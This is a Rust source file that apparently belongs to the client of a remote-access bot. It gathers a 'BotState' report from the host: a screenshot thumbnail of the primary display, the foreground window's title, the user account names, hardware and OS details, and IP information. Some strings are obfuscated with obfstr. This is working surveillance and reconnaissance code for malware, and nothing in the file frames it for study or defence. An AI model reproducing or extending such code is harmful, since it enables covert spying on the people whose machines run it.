use client_vars::types::structs::{ BotState, DynamicInfo, HardwareInfo, IpInfo, OSInfo };
use sysinfo::CpuRefreshKind;
use sysinfo::MemoryRefreshKind;
use sysinfo::RefreshKind;
use sysinfo::System;
use anyhow::{ Context, Result };
use obfstr::obfstr as s;
use sysinfo::Users;
use winapi::shared::ntdef::LPSTR;
use winapi::um::winuser::{ GetForegroundWindow, GetWindowTextA, GetWindowTextLengthA };
use std::io::Cursor;
use screenshots::Screen;
use screenshots::image;
use crate::network::basic::get_ip_info;

fn get_active_window() -> String {
    unsafe {
        let hwnd = GetForegroundWindow();
        let length = GetWindowTextLengthA(hwnd) + 1;
        let mut title = vec![0u8; length as usize];
        GetWindowTextA(hwnd, title.as_mut_ptr() as LPSTR, length);
        return String::from_utf8_lossy(&title).to_string();
    }
}
pub fn get_thumbnail() -> Result<Vec<u8>> {
    let primary_screen = Screen::all()
        .context("Failed to get all screens")?
        .into_iter()
        .find(|screen| screen.display_info.is_primary)
        .ok_or_else(|| anyhow::anyhow!(s!("No primary screen found").to_string()))?;
    let image_buffer = primary_screen.capture().context("Failed to capture screen")?;

    let image: image::DynamicImage = image::DynamicImage::ImageRgba8(image_buffer);
    let thumbnail: image::DynamicImage = image.resize(
        256,
        144,
        image::imageops::FilterType::Lanczos3
    );
    let mut buffer: Cursor<Vec<u8>> = Cursor::new(Vec::new());
    thumbnail.write_to(&mut buffer, image::ImageFormat::Jpeg)?;
    Ok(buffer.into_inner())
}

pub fn get_dynamic_info() -> DynamicInfo {
    let sys = System::new_with_specifics(
        RefreshKind::nothing()
            .with_cpu(CpuRefreshKind::everything())
            .with_memory(MemoryRefreshKind::everything())
    );
    DynamicInfo {
        free_ram: sys.free_memory(),
        cpu_usage: sys.global_cpu_usage(),
        active_window: get_active_window(),
    }
}

pub async fn generate_bot_state() -> BotState {
    let mut sys = System::new_all();

    sys.refresh_all();
    std::thread::sleep(sysinfo::MINIMUM_CPU_UPDATE_INTERVAL);

    BotState {
        thumbnail: get_thumbnail()
            .map(Some)
            .unwrap_or_else(|error| {
                // err!("Error getting thumbnail", error);
                None
            }),
        dynamic_info: get_dynamic_info(),
        hw_info: HardwareInfo {
            total_ram: sys.total_memory(),
            core_count: sys.physical_core_count(),
            cpu_vendor_id: sys.cpus()[0].vendor_id().to_owned(),
            cpu_brand: sys.cpus()[0].brand().to_owned(),
        },
        os_info: OSInfo {
            boot_time: System::boot_time(),
            host_name: System::host_name(),
            os_version: System::long_os_version(),
            users: Users::new_with_refreshed_list()
                .list()
                .iter()
                .map(|user| user.name().to_string())
                .collect::<Vec<String>>(),
        },
        ip_info: get_ip_info().await.unwrap_or(IpInfo::default()),
    }
}
